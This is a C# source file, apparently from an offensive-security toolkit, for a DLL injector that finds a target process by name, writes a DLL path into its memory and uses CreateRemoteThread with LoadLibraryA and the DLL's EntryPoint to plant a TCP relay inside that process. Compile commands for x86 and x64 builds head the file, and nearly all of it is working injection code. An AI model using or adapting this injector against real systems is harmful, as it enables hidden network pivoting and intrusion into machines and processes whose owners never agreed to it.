/*
Author: @Arno0x0x (https://twitter.com/Arno0x0x)

================================ Compile as an x86 .Net exe ==============================
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:anycpu32bitpreferred /out:TcpRelayInjecter_x86.exe TcpRelayInjecter.cs

================================ Compile as an x64 .Net exe ==============================
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:x64 /out:TcpRelayInjecter_x64.exe TcpRelayInjecter.cs

*/

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class TcpRelayInjecter
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("kernel32.dll", SetLastError=true, CharSet = CharSet.Auto)]
    public static extern IntPtr LoadLibrary(string lpModuleName);
	
    [DllImport("kernel32.dll",  SetLastError=true, CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

	[DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool IsWow64Process([In] IntPtr process, [Out] out bool wow64Process);
		
    // privileges
    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

    // used for memory allocation
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 4;
	const uint PAGE_EXECUTE_READWRITE = 0x40;
	
		
	//----------------------------------------------------------------------------------------------------------------------------------
	// Method to check whether a process is 32bits or 64bits
	//----------------------------------------------------------------------------------------------------------------------------------
	private static bool IsWin64Emulator(IntPtr hProcess)
	{
	   if ((Environment.OSVersion.Version.Major > 5) || ((Environment.OSVersion.Version.Major == 5) && (Environment.OSVersion.Version.Minor >= 1)))
		{
			bool retVal;

			return IsWow64Process(hProcess, out retVal) && retVal;
		}

       return false; // not on 64-bit Windows Emulator
	}

	//----------------------------------------------------------------------------------------------------------------------------------
	//																MAIN
	//----------------------------------------------------------------------------------------------------------------------------------
    public static int Main(string[] args)
    {
		//-----------------------------------------------
		// Check we have enough arguments
		if (args.Length < 3) {
			Console.WriteLine("[ERROR] Missing arguments");
			Console.WriteLine("Usage:\n{0} <target_process_name> <source_port> <dest_port> [dest_IP]", Environment.CommandLine);
			return -1;
		}
		
		//-----------------------------------------------
		// Retrieve the target process ID
		Process targetProcess;
		try {
			targetProcess = Process.GetProcessesByName(args[0].Split('.')[0])[0];
		}
		catch {
			Console.WriteLine("[ERROR] Could not locate process " + args[0]);
			return -1;
		}
		
		Console.WriteLine("[INFO] Targetting process {0} with process ID {1}",args[0],targetProcess.Id);
		
		//-----------------------------------------------
		// Preparing the arguments for the DLL to be injected
		string dllArguments = args[1] + "," + args[2];
		
		// Check if we have the optionnal destination IP argument is set
		if (args.Length > 3) {
			dllArguments = dllArguments + "," + args[3];
		}
			
		// Full path to the dll we want to inject
        string dllPath = AppDomain.CurrentDomain.BaseDirectory;
		if (!IsWin64Emulator(targetProcess.Handle)) {
			dllPath = dllPath + "TcpRelay_x64.dll";
			Console.WriteLine("[INFO] Target process is 64 bits, injecting " + dllPath);
		} else {
			dllPath = dllPath + "TcpRelay_x86.dll";
			Console.WriteLine("[INFO] Target process is 32 bits, injecting " + dllPath);
		}
						
		//-----------------------------------------------
        // Get a handle on the target process, with appropriate privileges
        IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
		if (procHandle == IntPtr.Zero) {
			Console.WriteLine("[ERROR] Could not open process");
			return -1;
		}
		
		//-----------------------------------------------
        // Search for the address of LoadLibraryA and store it in a pointer
        IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
		if (loadLibraryAddr == IntPtr.Zero) {
			Console.WriteLine("[ERROR] Could not locate the address for the LoadLibraryA");
			return -1;
		}
		
		//-----------------------------------------------
        //Allocate some memory into the target process - enough to store the name of the DLL to be injected
        // and store its address in a pointer
        IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (allocMemAddress == IntPtr.Zero) {
			Console.WriteLine("[ERROR] Could not locate allocate memory into the remote process");
			return -1;
		}
		
		//-----------------------------------------------
        // Write the name of the dll to be injected into the target process memory
        UIntPtr bytesWritten;
        if (WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten) == false) {
			Console.WriteLine("[ERROR] Could not write into the memory of the remote process");
			return -1;
		}
		
		//-----------------------------------------------
        // Create a thread that will call LoadLibraryA with allocMemAddress as argument
        if (CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero) == IntPtr.Zero){
			Console.WriteLine("[ERROR] Could not create a remote thread into the target process");
			return -1;
		}
		
		//-----------------------------------------------
        // Search for the address of the EntryPoint method in the injected DLL and store it into a pointer
		IntPtr entryPointAddr = GetProcAddress(LoadLibrary(dllPath), "EntryPoint");
		if (entryPointAddr == IntPtr.Zero) {
			Console.WriteLine("[ERROR] Could not locate the address for the EntryPoint.");
			Console.WriteLine("Last Error: " + Marshal.GetLastWin32Error());
			return -1;
		}
				
		//-----------------------------------------------
        // Allocate some memory in the target process - enough to store the arguments for the injected DLL method
        // and store its address in a pointer
        allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllArguments.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		//-----------------------------------------------
        // Write the arguments for the method we'll call into the target process memory
        WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllArguments), (uint)((dllArguments.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);

		//-----------------------------------------------
        // creating a thread that will call LoadLibraryA with allocMemAddress as argument
		if (CreateRemoteThread(procHandle, IntPtr.Zero, 0, entryPointAddr, allocMemAddress, 0, IntPtr.Zero) == IntPtr.Zero){
			Console.WriteLine("[ERROR] Could not create a remote thread into the target process");
			return -1;
		}
		
		Console.WriteLine("[INFO] Remote process sucessfully injected :-) !");
        return 0;
    }
}